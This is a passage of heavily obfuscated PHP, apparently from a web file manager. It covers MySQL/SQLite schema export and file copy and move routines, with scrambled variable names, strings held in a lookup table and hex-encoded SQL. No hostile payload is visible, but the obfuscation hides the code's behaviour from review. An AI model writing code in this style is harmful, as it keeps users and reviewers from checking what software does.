$_SERVER[γγάψ½]; $ο“σΔ = array(); foreach ($ξ‹ΨΣΕ” as $›ƒ½ΥΏ…) { if (is_array($›ƒ½ΥΏ…)) { $›ƒ½ΥΏ… = json_encode_force($›ƒ½ΥΏ…); } $›ƒ½ΥΏ… = addslashes($›ƒ½ΥΏ…); $›ƒ½ΥΏ… = str_replace(array($ΧΘΥΚ‘[1165], $ΧΘΥΚ‘[288], $ΧΘΥΚ‘[420]), array($ΧΘΥΚ‘[1166], $ΧΘΥΚ‘[1167], $ΧΘΥΚ‘[1168]), $›ƒ½ΥΏ…); $ο“σΔ[] = $›ƒ½ΥΏ…; } return $ΧΘΥΚ‘[58] . implode($ΧΘΥΚ‘[1169], $ο“σΔ) . $ΧΘΥΚ‘[58]; } private function sqlDecode($‰™‰ίΪ, $―ΌΟΥ¨, $µκ“ΑΣκ = '') { $°ΨνΡΫ” =& $_SERVER[γγάψ½]; $‰™‰ίΪ = str_replace(array($°ΨνΡΫ”[1166], $°ΨνΡΫ”[1167], $°ΨνΡΫ”[1168]), array($°ΨνΡΫ”[1165], $°ΨνΡΫ”[288], $°ΨνΡΫ”[420]), $‰™‰ίΪ); if ($―ΌΟΥ¨ == $°ΨνΡΫ”[13]) { $‰™‰ίΪ = str_ireplace($°ΨνΡΫ”[1170], $°ΨνΡΫ”[59], $‰™‰ίΪ); $‰™‰ίΪ = stripslashes($‰™‰ίΪ); } return preg_replace($°ΨνΡΫ”[1171], $°ΨνΡΫ”[12], $‰™‰ίΪ); if ($―ΌΟΥ¨ == $°ΨνΡΫ”[13]) { return $µκ“ΑΣκ != $°ΨνΡΫ”[859] ? stripslashes($‰™‰ίΪ) : $‰™‰ίΪ; } if ($µκ“ΑΣκ == $°ΨνΡΫ”[859]) { $‰™‰ίΪ = str_replace($°ΨνΡΫ”[1172], $°ΨνΡΫ”[121], stripslashes($‰™‰ίΪ)); } return $‰™‰ίΪ; } public function getSqlFile($’¥Ή¤ΐ› = '') { $σΓ¦β€€ =& $_SERVER[γγάψ½]; $§ξλΚο = $this->dbType(!0); $ΨΑΎΥή = CONTROLLER_DIR . "\151\156\163\x74\x61\154\154\57\144\141\164\x61\x2f{$§ξλΚο}\x2e\163\x71\x6c"; $ρΈΑ²„« = file_get_contents($ΨΑΎΥή); $δ—²ΉΕ = $σΓ¦β€€[1173] . ($§ξλΚο == $σΓ¦β€€[883] ? $σΓ¦β€€[1174] : $σΓ¦β€€[1175]) . $σΓ¦β€€[1176]; preg_match_all($δ—²ΉΕ, $ρΈΑ²„«, $¦²ΟίΧ®); $Ης•–ΑΪ = $¦²ΟίΧ®[1]; $Άυςώκϊ = $this->model()->db(); $ΕϋΔ = $Άυςώκϊ->getTables(); $β©γΥθ½ = TEMP_FILES . $σΓ¦β€€[1177] . date($σΓ¦β€€[262]) . $σΓ¦β€€[8]; del_dir($β©γΥθ½); mk_dir($β©γΥθ½); $ή·θ§ = $β©γΥθ½ . $σΓ¦β€€[1178]; $‰κΏκζΒ = $β©γΥθ½ . $σΓ¦β€€[1179]; $ΌδωΙΨΠ = $§ξλΚο == $σΓ¦β€€[13] ? $σΓ¦β€€[883] : $σΓ¦β€€[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\x61\x6c\x6c\x2f\144\x61\164\141\x2f{$ΌδωΙΨΠ}\x2e\163\161\154", $β©γΥθ½); @touch($β©γΥθ½ . $§ξλΚο . $σΓ¦β€€[865]); $Ϋ›™…λ— = fopen($ή·θ§, $σΓ¦β€€[1153]); $ ρ½«‚Ε = fopen($‰κΏκζΒ, $σΓ¦β€€[1153]); if ($§ξλΚο == $σΓ¦β€€[13]) { $ΕϋΔ = array_diff($ΕϋΔ, array($σΓ¦β€€[857], $σΓ¦β€€[858])); $Β°ΔΠχ = array($σΓ¦β€€[1180], $σΓ¦β€€[1181], $σΓ¦β€€[1182]); fwrite($ ρ½«‚Ε, implode(PHP_EOL, $Β°ΔΠχ) . PHP_EOL . PHP_EOL); foreach ($ΕϋΔ as $Β¨ύΕ) { $Ε—ι­ = $this->sqlFromSqlite($Β¨ύΕ); if (!$Ε—ι­[$σΓ¦β€€[13]]) { continue; } fwrite($ ρ½«‚Ε, $Ε—ι­[$σΓ¦β€€[13]] . PHP_EOL . PHP_EOL); if (!in_array($Β¨ύΕ, $Ης•–ΑΪ)) { fwrite($Ϋ›™…λ—, $Ε—ι­[$σΓ¦β€€[883]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ΕϋΔ as $Β¨ύΕ) { $Ε—ι­ = $this->sqlFromMysql($Β¨ύΕ); if (!$Ε—ι­[$σΓ¦β€€[883]]) { continue; } fwrite($Ϋ›™…λ—, $Ε—ι­[$σΓ¦β€€[883]] . PHP_EOL . PHP_EOL); if (!in_array($Β¨ύΕ, $Ης•–ΑΪ)) { fwrite($ ρ½«‚Ε, $Ε—ι­[$σΓ¦β€€[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ϋ›™…λ—); fclose($ ρ½«‚Ε); $ρΈΑ²„« = array($σΓ¦β€€[883] => $ή·θ§, $σΓ¦β€€[13] => $‰κΏκζΒ); return $’¥Ή¤ΐ› ? $ρΈΑ²„«[$’¥Ή¤ΐ›] : $ρΈΑ²„«; } public function dbType($΅¦φµε = false) { $™Τ”λ =& $_SERVER[γγάψ½]; $ρχµΒΎ = $΅¦φµε ? $GLOBALS[$™Τ”λ[6]][$™Τ”λ[21]] : $this->database; $ρχµΒΎ = array_change_key_case($ρχµΒΎ); $όθ΅όήσ = $ρχµΒΎ[$™Τ”λ[1053]]; if ($όθ΅όήσ == $™Τ”λ[1050]) { $¨­ΩΏ΅ = explode($™Τ”λ[4], $ρχµΒΎ[$™Τ”λ[1059]]); $όθ΅όήσ = $¨­ΩΏ΅[0]; } $Ύ•Μ‡ = array($™Τ”λ[1183] => $™Τ”λ[13], $™Τ”λ[998] => $™Τ”λ[883]); if (isset($Ύ•Μ‡[$όθ΅όήσ])) { $όθ΅όήσ = $Ύ•Μ‡[$όθ΅όήσ]; } return $όθ΅όήσ; } public function sqlFromMysql($λ£ϊύΛ›, $Α¬ή“ϋ = '') { $‘‘ΠΘ‘ =& $_SERVER[γγάψ½]; $β¦ϋ£ = $this->model()->db(); $ζω±ƒζψ = $β¦ϋ£->query($‘‘ΠΘ‘[1184] . $λ£ϊύΛ› . $‘‘ΠΘ‘[464]); if (!$ζω±ƒζψ || !$ζω±ƒζψ[0]) { return !1; } $¨·—¤ή = _get($ζω±ƒζψ[0], $‘‘ΠΘ‘[1185], $‘‘ΠΘ‘[12]); if (!$¨·—¤ή) { return !1; } $ίλ‰Ώ = "\x44\122\x4f\x50\x20\x54\x41\x42\114\105\40\111\106\x20\x45\130\111\x53\124\x53\x20\140{$λ£ϊύΛ›}\140\x3b" . PHP_EOL . $¨·—¤ή . $‘‘ΠΘ‘[74]; if ($Α¬ή“ϋ && $Α¬ή“ϋ == $‘‘ΠΘ‘[883]) { return $ίλ‰Ώ; } $—ΰΎ΅Χδ = array_change_key_case($GLOBALS[$‘‘ΠΘ‘[6]][$‘‘ΠΘ‘[21]]); $χοθ»΄Α = $—ΰΎ΅Χδ[$‘‘ΠΘ‘[1058]]; $¤ ΩβΡβ = $‘‘ΠΘ‘[1186] . $χοθ»΄Α . $‘‘ΠΘ‘[1187] . $λ£ϊύΛ› . $‘‘ΠΘ‘[58]; $ΚΖΎζΠύ = $‘‘ΠΘ‘[1188] . $λ£ϊύΛ› . $‘‘ΠΘ‘[986]; $¶·›‹Ύ = $β¦ϋ£->query($¤ ΩβΡβ); if (empty($¶·›‹Ύ)) { $Ίψ΅ςΥ = array($‘‘ΠΘ‘[883] => $‘‘ΠΘ‘[12], $‘‘ΠΘ‘[13] => $‘‘ΠΘ‘[12]); return $Α¬ή“ϋ ? $Ίψ΅ςΥ[$Α¬ή“ϋ] : $Ίψ΅ςΥ; } $΄Σ£«Τ = $β¦ϋ£->query($ΚΖΎζΠύ); $™¬ ψ‹› = $‘‘ΠΘ‘[12]; $σ¶Άν = array(); foreach ($΄Σ£«Τ as $Ν©Έ²Κν) { if (!$™¬ ψ‹› && $Ν©Έ²Κν[$‘‘ΠΘ‘[1189]] == $‘‘ΠΘ‘[1190]) { $™¬ ψ‹› = $Ν©Έ²Κν[$‘‘ΠΘ‘[1191]]; } if (isset($σ¶Άν[$Ν©Έ²Κν[$‘‘ΠΘ‘[1189]]])) { $σ¶Άν[$Ν©Έ²Κν[$‘‘ΠΘ‘[1189]]][$‘‘ΠΘ‘[1192]][] = $Ν©Έ²Κν[$‘‘ΠΘ‘[1191]]; continue; } $σ¶Άν[$Ν©Έ²Κν[$‘‘ΠΘ‘[1189]]] = array($‘‘ΠΘ‘[1193] => $Ν©Έ²Κν[$‘‘ΠΘ‘[1189]], $‘‘ΠΘ‘[1192] => array($Ν©Έ²Κν[$‘‘ΠΘ‘[1191]]), $‘‘ΠΘ‘[1194] => $Ν©Έ²Κν[$‘‘ΠΘ‘[1195]] == $‘‘ΠΘ‘[91] ? 0 : 1); } $‘±·Ωθύ = array(); foreach ($σ¶Άν as $Ν©Έ²Κν) { $–ƒ–Έό = $Ν©Έ²Κν[$‘‘ΠΘ‘[1193]] == $‘‘ΠΘ‘[1190]; $®Ξ–£Κ = array($‘‘ΠΘ‘[1196], $Ν©Έ²Κν[$‘‘ΠΘ‘[1194]] == $‘‘ΠΘ‘[91] && !$–ƒ–Έό ? $‘‘ΠΘ‘[1197] : $‘‘ΠΘ‘[12], $‘‘ΠΘ‘[1198], $‘‘ΠΘ‘[1199] . $λ£ϊύΛ› . $‘‘ΠΘ‘[11] . ($–ƒ–Έό ? $‘‘ΠΘ‘[1200] : $Ν©Έ²Κν[$‘‘ΠΘ‘[1193]]) . $‘‘ΠΘ‘[121], $‘‘ΠΘ‘[1201], $‘‘ΠΘ‘[121] . $λ£ϊύΛ› . $‘‘ΠΘ‘[121], $‘‘ΠΘ‘[1202] . implode($‘‘ΠΘ‘[1203], $Ν©Έ²Κν[$‘‘ΠΘ‘[1192]]) . $‘‘ΠΘ‘[1204]); $‘±·Ωθύ[] = implode($‘‘ΠΘ‘[53], $®Ξ–£Κ) . $‘‘ΠΘ‘[74]; } $³¥ωΑΚ = array(); $¤•ζρς = array($‘‘ΠΘ‘[1205] => $‘‘ΠΘ‘[1206], $‘‘ΠΘ‘[1206] => $‘‘ΠΘ‘[1206], $‘‘ΠΘ‘[366] => $‘‘ΠΘ‘[393], $‘‘ΠΘ‘[365] => $‘‘ΠΘ‘[393]); foreach ($¶·›‹Ύ as $Ν©Έ²Κν) { $®Ξ–£Κ = array($‘‘ΠΘ‘[121] . $Ν©Έ²Κν[$‘‘ΠΘ‘[1207]] . $‘‘ΠΘ‘[121], isset($¤•ζρς[$Ν©Έ²Κν[$‘‘ΠΘ‘[1208]]]) ? $¤•ζρς[$Ν©Έ²Κν[$‘‘ΠΘ‘[1208]]] : $Ν©Έ²Κν[$‘‘ΠΘ‘[1209]], $Ν©Έ²Κν[$‘‘ΠΘ‘[1210]] == $‘‘ΠΘ‘[984] ? $‘‘ΠΘ‘[1211] : $‘‘ΠΘ‘[1212], $Ν©Έ²Κν[$‘‘ΠΘ‘[1207]] == $™¬ ψ‹› ? $‘‘ΠΘ‘[1213] : $‘‘ΠΘ‘[12], $Ν©Έ²Κν[$‘‘ΠΘ‘[1035]] ? strtoupper(str_replace($‘‘ΠΘ‘[11], $‘‘ΠΘ‘[12], $Ν©Έ²Κν[$‘‘ΠΘ‘[1035]])) : $‘‘ΠΘ‘[12]); $³¥ωΑΚ[] = trim(implode($‘‘ΠΘ‘[53], $®Ξ–£Κ)); } $Θξ‰ΟΛί = array($‘‘ΠΘ‘[1214] . $λ£ϊύΛ› . $‘‘ΠΘ‘[1215], $‘‘ΠΘ‘[1216] . $λ£ϊύΛ› . $‘‘ΠΘ‘[1217], implode($‘‘ΠΘ‘[50] . PHP_EOL, $³¥ωΑΚ), $‘‘ΠΘ‘[1032]); $°ξγΒ΄« = implode(PHP_EOL, array_merge($Θξ‰ΟΛί, $‘±·Ωθύ)); if ($Α¬ή“ϋ && $Α¬ή“ϋ == $‘‘ΠΘ‘[13]) { return $°ξγΒ΄«; } $Ίψ΅ςΥ = array($‘‘ΠΘ‘[883] => $ίλ‰Ώ, $‘‘ΠΘ‘[13] => $°ξγΒ΄«); return $Α¬ή“ϋ ? $Ίψ΅ςΥ[$Α¬ή“ϋ] : $Ίψ΅ςΥ; } public function sqlFromSqlite($ΡΛψ‚ςΗ, $μοΣ—Ή— = '') { $¶φ®ωσ =& $_SERVER[γγάψ½]; $³ώηΩό¥ = $this->model()->db(); $®Ί™κ” = "\x50\122\101\x47\x4d\x41\x20\x54\101\102\114\105\x5f\x49\116\106\117\40\x28\47{$ΡΛψ‚ςΗ}\x27\x29"; $Ή£α±• = "\123\105\114\105\x43\x54\40\52\40\x46\x52\117\x4d\x20\163\161\154\151\164\145\x5f\155\x61\x73\x74\x65\162\40\127\x48\105\122\105\40\x74\x62\x6c\137\156\141\x6d\x65\40\x3d\x20\x27{$ΡΛψ‚ςΗ}\47"; $ΣΫξ¨ = $³ώηΩό¥->query($®Ί™κ”); if (empty($ΣΫξ¨)) { $ωΑƒ²ϊ” = array($¶φ®ωσ[883] => $¶φ®ωσ[12], $¶φ®ωσ[13] => $¶φ®ωσ[12]); return $μοΣ—Ή— ? $ωΑƒ²ϊ”[$μοΣ—Ή—] : $ωΑƒ²ϊ”; } $ΚΟώΨ£ = $³ώηΩό¥->query($Ή£α±•); $ΆΥ³λ„° = $ΝΩΔυύ = array(); foreach ($ΚΟώΨ£ as $ζ±•Φ¶θ) { if ($ζ±•Φ¶θ[$¶φ®ωσ[33]] == $¶φ®ωσ[359]) { $ΆΥ³λ„°[] = $ζ±•Φ¶θ[$¶φ®ωσ[1218]]; } else { $ΝΩΔυύ[$ζ±•Φ¶θ[$¶φ®ωσ[32]]] = $ζ±•Φ¶θ[$¶φ®ωσ[1218]]; } } $‚ω¥υΚ = array_merge(array($¶φ®ωσ[1214] . $ΡΛψ‚ςΗ . $¶φ®ωσ[121]), $ΆΥ³λ„°, array_values($ΝΩΔυύ)); $‚ω¥υΚ = implode($¶φ®ωσ[74] . PHP_EOL, $‚ω¥υΚ) . $¶φ®ωσ[74]; if ($μοΣ—Ή— && $μοΣ—Ή— == $¶φ®ωσ[13]) { return $‚ω¥υΚ; } $°”±υ§δ = array(); foreach ($ΝΩΔυύ as $›—°σφ => $Υ΄Ό™Χ) { $Δ„ϊΎ€λ = str_replace($¶φ®ωσ[1219] . $ΡΛψ‚ςΗ . $¶φ®ωσ[11], $¶φ®ωσ[12], $›—°σφ); $Δ„ϊΎ€λ = str_replace($ΡΛψ‚ςΗ . $¶φ®ωσ[11], $¶φ®ωσ[12], $›—°σφ); $ΎΗΝ = str_replace(array($¶φ®ωσ[121], $¶φ®ωσ[1043]), $¶φ®ωσ[464], substr($Υ΄Ό™Χ, stripos($Υ΄Ό™Χ, $¶φ®ωσ[340]))); $°”±υ§δ[$Δ„ϊΎ€λ] = $ΎΗΝ; } $Ρχϋ© = array(); $³­ϋΘύ  = array($¶φ®ωσ[1206] => $¶φ®ωσ[1220], $¶φ®ωσ[393] => $¶φ®ωσ[1221]); $φΔ °²» = $”οίΘ©Ά = $¶φ®ωσ[12]; foreach ($ΣΫξ¨ as $ζ±•Φ¶θ) { if ($ζ±•Φ¶θ[$¶φ®ωσ[57]] == $¶φ®ωσ[91]) { $φΔ °²» = $ζ±•Φ¶θ[$¶φ®ωσ[32]]; } $ΉΕ΅®Φ = $ζ±•Φ¶θ[$¶φ®ωσ[33]]; if ($ΉΕ΅®Φ == $¶φ®ωσ[1222] && isset($°”±υ§δ[$ζ±•Φ¶θ[$¶φ®ωσ[32]]])) { $ΉΕ΅®Φ = $¶φ®ωσ[1223]; } $ΰθθΈέ = array($¶φ®ωσ[464] . $ζ±•Φ¶θ[$¶φ®ωσ[32]] . $¶φ®ωσ[464], _get($³­ϋΘύ , $ΉΕ΅®Φ, $ΉΕ΅®Φ), $ζ±•Φ¶θ[$¶φ®ωσ[35]] == $¶φ®ωσ[91] ? $¶φ®ωσ[1211] : $¶φ®ωσ[1224] . $ζ±•Φ¶θ[$¶φ®ωσ[56]], $ζ±•Φ¶θ[$¶φ®ωσ[57]] == $¶φ®ωσ[91] ? $¶φ®ωσ[1225] : $¶φ®ωσ[12]); $Ρχϋ©[] = trim(implode($¶φ®ωσ[53], $ΰθθΈέ)); } foreach ($°”±υ§δ as $Δ„ϊΎ€λ => $ΎΗΝ) { if ($Δ„ϊΎ€λ == $¶φ®ωσ[1200]) { $ψΥ©ξΣ = $”οίΘ©Ά = $¶φ®ωσ[1226] . $φΔ °²» . $¶φ®ωσ[1227]; } else { $ψΥ©ξΣ = (stripos($Δ„ϊΎ€λ, $¶φ®ωσ[11]) ? $¶φ®ωσ[1228] : $¶φ®ωσ[12]) . ($¶φ®ωσ[1229] . $Δ„ϊΎ€λ . $¶φ®ωσ[1230] . $ΎΗΝ); } $Ρχϋ©[] = $ψΥ©ξΣ; } if ($φΔ °²» && !$”οίΘ©Ά) { $Ρχϋ© = array_merge(array($¶φ®ωσ[1226] . $φΔ °²» . $¶φ®ωσ[1227]), $Ρχϋ©); } $¥Υ‚Δ = array($¶φ®ωσ[1231] . $ΡΛψ‚ςΗ . $¶φ®ωσ[1232], $¶φ®ωσ[1233] . $ΡΛψ‚ςΗ . $¶φ®ωσ[1234], implode($¶φ®ωσ[50] . PHP_EOL, $Ρχϋ©), $¶φ®ωσ[1235]); $—Ηκµ¦· = implode(PHP_EOL, $¥Υ‚Δ); if ($μοΣ—Ή— && $μοΣ—Ή— == $¶φ®ωσ[883]) { return $—Ηκµ¦·; } $ωΑƒ²ϊ” = array($¶φ®ωσ[883] => $—Ηκµ¦·, $¶φ®ωσ[13] => $‚ω¥υΚ); return $μοΣ—Ή— ? $ωΑƒ²ϊ”[$μοΣ—Ή—] : $ωΑƒ²ϊ”; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($‰Μ¬Ϊ£, $Άύκο) { $—»ύΫ Ψ =& $_SERVER[γγάψ½]; $‚λΰ£“¬ = $Άύκο; $GLOBALS[$—»ύΫ Ψ[1236]] = $—»ύΫ Ψ[1237] . $‰Μ¬Ϊ£; Hook::trigger($—»ύΫ Ψ[1237] . $‰Μ¬Ϊ£ . $—»ύΫ Ψ[1238], $‚λΰ£“¬); $»ΣδώΚ = self::driverMake($Άύκο[0]); if (!$»ΣδώΚ) { return !1; } if (method_exists($»ΣδώΚ, $‰Μ¬Ϊ£)) { $΅ΙΥ΅ = @call_user_func_array(array($»ΣδώΚ, $‰Μ¬Ϊ£), $Άύκο); } else { if (method_exists($»ΣδώΚ, $—»ύΫ Ψ[1239])) { $΅ΙΥ΅ = @call_user_func_array(array($»ΣδώΚ, $‰Μ¬Ϊ£), $Άύκο); } else { if (method_exists(self, $‰Μ¬Ϊ£)) { $΅ΙΥ΅ = @call_user_func_array(array(self, $‰Μ¬Ϊ£), $Άύκο); } else { $΅ΙΥ΅ = call_user_func_array(array(parent, $‰Μ¬Ϊ£), $Άύκο); } } } Hook::trigger($—»ύΫ Ψ[1237] . $‰Μ¬Ϊ£ . $—»ύΫ Ψ[1240], $‚λΰ£“¬, $΅ΙΥ΅); return $΅ΙΥ΅; } public static function init($»½δ η¥) { return self::driverMake($»½δ η¥); } public static function copy($Λ΅Ϋ½‡, $§΅ΤΠϊΚ, $ζ—¦ΪΙ = false, $¦’“ = false) { return self::copyMoveStart($Λ΅Ϋ½‡, $§΅ΤΠϊΚ, $ζ—¦ΪΙ, $_SERVER[γγάψ½][626], $¦’“); } public static function move($ΧΌσ»Τ, $‰™οθ¬φ, $όΉ½¦ο¶ = false, $σδΈσ¥ς = false) { return self::copyMoveStart($ΧΌσ»Τ, $‰™οθ¬φ, $όΉ½¦ο¶, $_SERVER[γγάψ½][628], $σδΈσ¥ς); } public static function copyMoveChildren($±‚Ι–›Π, $ωϊπΞπ¤, $ξςθΨ = "\143\157\x70\171", $ƒ†ύάΡί = REPEAT_REPLACE) { $υοΗΐθ =& $_SERVER[γγάψ½]; $Ο€π„Κ = $±‚Ι–›Π; $υ­μ£° = self::driverMake($±‚Ι–›Π); $²ή’ο³ = $υ­μ£°->listPath($±‚Ι–›Π, !0); $ΆζΆγΑΐ = array_merge($²ή’ο³[$υοΗΐθ[86]], $²ή’ο³[$υοΗΐθ[85]]); foreach ($ΆζΆγΑΐ as $ΆΕ¤υ) { self::copyMoveStart($ΆΕ¤υ[$υοΗΐθ[87]], $ωϊπΞπ¤, $ƒ†ύάΡί, $ξςθΨ, !1); } if ($ξςθΨ == $υοΗΐθ[628]) { self::remove($Ο€π„Κ); } } private static function copyMoveStart($Τν›οΩό, $ϋ²«οΞλ, $ΧΙΩΟΗ§, $Ο—€¦έί, $κΙΝΎμσ) { $ωώ³Α¥φ =& $_SERVER[γγάψ½]; $‡Ξ©² = array($Τν›οΩό, $ϋ²«οΞλ, $ΧΙΩΟΗ§, $κΙΝΎμσ); Hook::trigger($ωώ³Α¥φ[1237] . $Ο—€¦έί . $ωώ³Α¥φ[1238], $‡Ξ©²); $ωκ®σ± = self::copyMove($Τν›οΩό, $ϋ²«οΞλ, $ΧΙΩΟΗ§, $Ο—€¦έί, $κΙΝΎμσ); Hook::trigger($ωώ³Α¥φ[1237] . $Ο—€¦έί . $ωώ³Α¥φ[1240], $‡Ξ©², $ωκ®σ±); return $ωκ®σ±; } public static function saveFile($τ¦ωµΘ³, $―βύ„“, $φ£ζζώρ = true) { $”±ϊίΕφ =& $_SERVER[γγάψ½]; $ζψνΗ©ι = self::info($―βύ„“); $›βΘΗ£ = self::driverMake($τ¦ωµΘ³); $ϊ›ϊ²ω = self::driverMake($―βύ„“); $ƒχα— = !1; if ($ϊ›ϊ²ω->pathParse[$”±ϊίΕφ[1241]]) { $ƒχα— = $ϊ›ϊ²ω; $“ή„ύΔΎ = $ϊ›ϊ²ω->pathParse[$”±ϊίΕφ[1241]]; $ϊ›ϊ²ω = self::driverMake($“ή„ύΔΎ); } if ($›βΘΗ£->pathParse[$”±ϊίΕφ[1241]]) { $ω¨υδσ = $›βΘΗ£->pathParse[$”±ϊίΕφ[1241]]; $›βΘΗ£ = self::driverMake($ω¨υδσ); } $Η—ΎΨ©ε = $ϊ›ϊ²ω->pathFather($―βύ„“); $κ–“χυ = !0; if (!$φ£ζζώρ && self::driverIsSame($›βΘΗ£, $ϊ›ϊ²ω)) { $κ–“χυ = !1; } $ξΘΞΥ = self::copyFile($›βΘΗ£, $τ¦ωµΘ³, $ϊ›ϊ²ω, $Η—ΎΨ©ε, $ζψνΗ©ι[$”±ϊίΕφ[32]], $κ–“χυ); if ($ƒχα—) { $ξΘΞΥ = $ƒχα—->getPathOuter($ξΘΞΥ); } return $ξΘΞΥ; } private static function copyMove($Ώ»΄η΄μ, $ΘΞίΑ—Ι, $ϋοσΠΕ, $μ«κ‘, $Ξ¤ξ™ = false) { $ΐΜ»΄• =& $_SERVER[γγάψ½]; if (!$Ώ»΄η΄μ || $Ώ»΄η΄μ == $ΐΜ»΄•[8] || !$ΘΞίΑ—Ι) { return !1; } ignore_timeout(); $δΊ²Πυ = self::driverMake($Ώ»΄η΄μ); $Πφ‰Ο = self::driverMake($ΘΞίΑ—Ι); $™½ΐπΗΙ = $μ«κ‘ == $ΐΜ»΄•[628]; $ίβΊοϋ  = !1; if ($Πφ‰Ο->pathParse[$ΐΜ»΄•[1241]]) { $ίβΊοϋ  = $Πφ‰Ο; $ΘΞίΑ—Ι = $Πφ‰Ο->pathParse[$ΐΜ»΄•[1241]]; $Πφ‰Ο = self::driverMake($ΘΞίΑ—Ι); } if ($δΊ²Πυ->pathParse[$ΐΜ»΄•[1241]]) { $Ώ»΄η΄μ = $δΊ²Πυ->pathParse[$ΐΜ»΄•[1241]]; $δΊ²Πυ = self::driverMake($Ώ»΄η΄μ); } self::check($δΊ²Πυ, $Ώ»΄η΄μ, $Πφ‰Ο, $ΘΞίΑ—Ι); Hook::trigger($ΐΜ»΄•[1242], $δΊ²Πυ, $Ώ»΄η΄μ, $Πφ‰Ο, $ΘΞίΑ—Ι); $Ό‡Ό’ι¶ = self::driverIsSame($δΊ²Πυ, $Πφ‰Ο); if ($Ό‡Ό’ι¶) { if ($μ«κ‘ == $ΐΜ»΄•[628] && !method_exists($Πφ‰Ο, $ΐΜ»΄•[1243]) && trim($ΘΞίΑ—Ι, $ΐΜ»΄•[8]) == trim($Πφ‰Ο->pathFather($Ώ»΄η΄μ), $ΐΜ»΄•[8])) { if ($δΊ²Πυ->pathThis($Ώ»΄η΄μ) != $Ξ¤ξ™ && !$δΊ²Πυ->isOsDriver()) { return $δΊ²Πυ->rename($Ώ»΄η΄μ, $Ξ¤ξ™); } return $Πφ‰Ο->getPathOuter($Ώ»΄η΄μ); } if (method_exists($Πφ‰Ο, $μ«κ‘)) { return $Πφ‰Ο->{$μ«κ‘}($Ώ»΄η΄μ, $ΘΞίΑ—Ι, $ϋοσΠΕ, $Ξ¤ξ™); } } if ($Ό‡Ό’ι¶ && $μ«κ‘ == $ΐΜ»΄•[628] && $Πφ‰Ο->getType() == $ΐΜ»΄•[109]) { $Γε‘ρΜ = $Πφ‰Ο->movePath($Ώ»΄η΄μ, $ΘΞίΑ—Ι, $Ξ¤ξ™); if ($Γε‘ρΜ) { return $Γε‘ρΜ; } } $Ζ‘β² = $δΊ²Πυ->isFile($Ώ»΄η΄μ); if (!$Ζ‘β² && $Πφ‰Ο->getType() == $ΐΜ»΄•[832] && $δΊ²Πυ->getType() == $ΐΜ»΄•[109]) { $Γε‘ρΜ = $Πφ‰Ο->copyFolderFromIO($δΊ²Πυ, $Ώ»΄η΄μ, $ΘΞίΑ—Ι, $ϋοσΠΕ, $™½ΐπΗΙ, $Ξ¤ξ™); } else { $Γε‘ρΜ = self::copyPath($δΊ²Πυ, $Ώ»΄η΄μ, $Πφ‰Ο, $ΘΞίΑ—Ι, $ϋοσΠΕ, $™½ΐπΗΙ, $Ζ‘β², $Ξ¤ξ™); } if ($Γε‘ρΜ && $™½ΐπΗΙ) { $δΊ²Πυ->remove($Ώ»΄η΄μ); } if ($ίβΊοϋ ) { $Γε‘ρΜ = $ίβΊοϋ ->getPathOuter($Γε‘ρΜ); } return $Γε‘ρΜ; } private static function check($¶›ΓΝ‰Ρ, $Α°ύΊλ, $ηχθ»®, &$®ΌϊΙΩ³) { $ΝΦέ½γκ =& $_SERVER[γγάψ½]; if (self::driverIsSame($¶›ΓΝ‰Ρ, $ηχθ»®) && $¶›ΓΝ‰Ρ->isFolder($Α°ύΊλ) && $¶›ΓΝ‰Ρ->isParentOf($Α°ύΊλ, $®ΌϊΙΩ³)) { show_json(LNG($ΝΦέ½γκ[1244]), !1); } if (!$¶›ΓΝ‰Ρ->exist($Α°ύΊλ)) { show_json(LNG($ΝΦέ½γκ[108]), !1); } } private static function copyPath($ΎΈ‹Λ…³, $°ΗΝ™©‡, $Θ±Ιθ½°, $„ωθ£ξ, $θ§¤π, $™¤‘„―­, $ΣΦ‚¬ό, $Δ”ωε—Ρ = false, $ΎΤήό™’ = true) { $¨ΉΕ― =& $_SERVER[γγάψ½]; $ΝεΔΎΧ‰ = empty($Δ”ωε—Ρ) && $Δ”ωε—Ρ !== $¨ΉΕ―[231] ? $ΎΈ‹Λ…³->pathThis($°ΗΝ™©‡) : $Δ”ωε—Ρ; if ($θ§¤π) { $ζ•®£Ώκ = $Θ±Ιθ½°->fileNameExist($„ωθ£ξ, $ΝεΔΎΧ‰); $³Ό„…κ = $ΝεΔΎΧ‰; $ΝεΔΎΧ‰ = $Θ±Ιθ½°->fileNameAuto($„ωθ£ξ, $ΝεΔΎΧ‰, $θ§¤π, !$ΣΦ‚¬ό); if (!$ζ•®£Ώκ || $³Ό„…κ != $ΝεΔΎΧ‰) { $θ§¤π = !1; } if ($ΎΤήό™’ && !$θ§¤π) { $Θ±Ιθ½°->_data[$¨ΉΕ―[1245]] = !0; } } if ($ΣΦ‚¬ό) { return self::copyFile($ΎΈ‹Λ…³, $°ΗΝ™©‡, $Θ±Ιθ½°, $„ωθ£ξ, $ΝεΔΎΧ‰, $™¤‘„―­); } if ($θ§¤π == REPEAT_RENAME_FOLDER) { $θ§¤π = !1; } $†Ϋ―ΏΌύ = rtrim($„ωθ£ξ, $¨ΉΕ―[8]) . $¨ΉΕ―[8] . $ΝεΔΎΧ‰; $ΗΖμ‘Ή = $Θ±Ιθ½°->mkdir($Θ±Ιθ½°->getPath($†Ϋ―ΏΌύ), $θ§¤π); $„ωθ£ξ = $Θ±Ιθ½°->getPathInner($ΗΖμ‘Ή); $€ΔΗΖχΣ = $ΎΈ‹Λ…³->listPath($°ΗΝ™©‡, !0); $€ΔΗΖχΣ = is_array($€ΔΗΖχΣ) ? $€ΔΗΖχΣ : array($¨ΉΕ―[86] => array(), $¨ΉΕ―[85] => array()); $”•ψΘΊΥ = array_merge($€ΔΗΖχΣ[$¨ΉΕ―[86]], $€ΔΗΖχΣ[$¨ΉΕ―[85]]); foreach ($”•ψΘΊΥ as $§―Ά•») { $φΝ–γκ = $§―Ά•»[$¨ΉΕ―[33]] == $¨ΉΕ―[233]; $°ΗΝ™©‡ = $ΎΈ‹Λ…³->getPathInner($§―Ά•»[$¨ΉΕ―[87]]); $…³ζΝΏ = self::copyPath($ΎΈ‹Λ…³, $°ΗΝ™©‡, $Θ±Ιθ½°, $„ωθ£ξ, $θ§¤π, $™¤‘„―­, $φΝ–γκ, !1, !1); if (!$…³ζΝΏ) { IO::errorTips($¨ΉΕ―[1246] . 